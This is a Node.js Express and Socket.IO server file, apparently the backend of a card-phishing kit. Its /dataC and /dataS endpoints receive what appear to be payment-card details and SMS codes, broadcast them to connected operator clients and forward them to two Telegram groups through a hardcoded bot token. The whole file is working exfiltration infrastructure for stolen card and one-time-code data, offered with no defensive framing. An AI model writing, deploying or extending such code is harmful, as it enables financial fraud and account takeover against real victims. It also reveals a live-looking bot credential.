// Importing necessary modules
const TelegramBot = require('node-telegram-bot-api');
const token = '6336680132:AAF2OsVc6-wAPG3FRCl5TpFbHHY_avIWedw';
const bot = new TelegramBot(token, { polling: false });
const groupIdCC = '-1001962858861';
const groupIdSS = '-1002030300737';

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

// Create the first Express app
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// Create an HTTP server
const server = http.createServer(app);

// Attach Socket.IO to the HTTP server
const io = socketIo(server);

const jsonData = {
  message: 'Done!',
};

app.get('/', (req, res) => {
  res.send(jsonData);
});

app.post('/dataIO', (req, res) => {
  //console.log('DATA IO',req.body.data);
  const data_ = req.body.data;
  io.emit('user_online',data_);
  res.status(200).send(jsonData);
});

app.post('/dataC', (req, res) => {
  //console.log('DATA C',req.body.data);
  const data_ = req.body.data;
  io.emit('card_got',data_);
  bot.sendMessage(groupIdCC, data_).then(() => {})
  .catch((error) => {
      console.log("ERROR",error);
  });
  res.status(200).send(jsonData);
});

app.post('/dataS', (req, res) => {
	const data_ = req.body.data;
    //console.log('Received message:', data_);
	io.emit('sms_got',data_);
    bot.sendMessage(groupIdSS, data_).then(() => {})
    .catch((error) => {
      console.log("ERROR",error);
    });
	res.status(200).send(jsonData);
});

// Socket.IO event handlers
io.on('connection', (socket) => {
  console.log('WebSocket client connected');
  socket.on('message', (message) => {
    console.log('Received message:', message);
    socket.emit('msg', 'Hello from WebSocket server!');
  });
  	socket.on('card_send' , function(data){
		io.emit('card_got',data);
	});
	socket.on('card_copy_ss' , function(data){
		io.emit('card_copy_pc',data);
	});
	socket.on('send_card_copy' , function(data){
		io.emit('card_copy',data);
	});
});

// Start the HTTP server
server.listen(port, () => {
  console.log(`Server running at ${port}`);
});







